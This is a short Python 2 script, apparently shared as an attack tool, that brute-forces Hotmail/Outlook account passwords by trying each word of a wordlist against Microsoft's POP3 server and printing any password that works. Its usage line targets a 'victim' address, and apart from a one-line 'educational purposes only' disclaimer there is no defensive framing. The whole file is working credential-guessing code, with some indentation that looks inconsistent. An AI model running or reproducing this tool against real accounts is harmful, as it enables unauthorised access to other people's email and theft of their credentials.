#!/usr/bin/python
# -*- coding: utf-8 -*-
# Hotmail brute forcer
# This program is only for educational purposes only. 

import sys, poplib, time 

log = "gne-hotmailbrute.log"
file = open(log, "a")
counter = 0
face = '''			
		'''

help = '''
Usage :  python hotmail.py -u [email] -w [wordlist]
Example :python hotmail.py -u victim@email.Com -w wordlist.txt
'''
    
for arg in sys.argv:
	if arg.lower() == '-u' or arg.lower() == '--user':
                email = sys.argv[int(sys.argv.index(arg))+1]
        elif arg.lower() == '-w' or arg.lower() == '--wordlist':
        	wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
        elif arg.lower() == '-h' or arg.lower() == '--help':
        	print face
        	print help
        	file.write(face)
        	file.write(help)

#Change these if needed.
HOST = 'pop3.live.com'
PORT = 995

try:
	preventstrokes = open(wordlist, "r")
	words 	       = preventstrokes.readlines()
	count          = 0 
	while count < len(words):
		words[count] = words[count].strip() 
		count += 1 
except(IOError): 
  	print "\n[-] Error: Check your wordlist path\n"
	file.write("\n[-] Error: Check your wordlist path\n")
  	sys.exit(1)
def definer():
	print "-" * 60
	print "[+] Email 		: %s" % email
	print "[+] Wordlist 		: %s" % wordlist
	print "[+] Length wordlist 	: %s " % len(words)
	print "[+] Time Starting 	: %s" % time.strftime("%X")
	print "-" * 60
	file.write ("\n[+] Email : %s" % email)
	file.write ("\n[+] Wordlist : %s" % wordlist)
	file.write ("\n[+] length wordlist : %s " % len(words))
	file.write ("\n[+] Time Starting : %s" % time.strftime("%X"))
	
def main(password):
	global counter
	sys.stdout.write ("[-] Trying : %s \n" % (password))
	sys.stdout.flush()
	file.write("[-] Trying : %s \n" % (str(password)))
	try:
		pop = poplib.POP3_SSL(HOST, PORT)
        	pop.user(email)
        	pop.pass_(password)
        	pop.quit()
        	print "[+] Found !!!\n[+] Username : [%s]\n[+] Password : [%s]\n[+] Status : Found !\n[+] My FB : Facebook.com/zakaria.siscovic   " % (email, password)
        	file.write("[+] Found !!!\n[+] Username : [%s]\n[+] Password : [%s]\n[+] Status : Found !\n[+] My FB : Facebook.com/zakaria.siscovic" % (email, password))
        	sys.exit(1)
    	except Exception, e:
        	pass 
        except KeyboardInterrupt:
		print "\n[-] Aborting...\n"
		file.write("\n[-] Aborting...\n")
		sys.exit(1)
	counter+=1
	if counter == len(words)/5:
		print "[+] Hotmailbruteforcer 20% way done..."
		print "[+] Please be patient..."	
		file.write("[+] hotmailbruteforcer on 1/4 way done...\n")
		file.write("[+] Please be patient...\n")
	elif counter == len(words)/4:
		print "[+] Hotmailbruteforcer 25% way done..."
		print "[+] Please be patient..."	
		file.write("[+] hotmailbruteforcer on 1/4 way done...\n")
		file.write("[+] Please be patient...\n")
	elif counter == len(words)/2:
		print "[+] Hotmailbruteforcer on 50% done..."
		print "[+] Please be patient..."	
		file.write("[+] hotmailbruteforcer on halfway done...\n")
		file.write("[+] Please be patient...\n")
	elif counter == len(words):
		print "[+] Hotmailbruteforcer done...\n"
		file.write("[+] Hotmailbruteforcer done...!\n")	
	
if __name__ == '__main__':
	print face
	file.write(face)
	definer()
	for password in words:
		main(password.replace("\n",""))
	main(password)
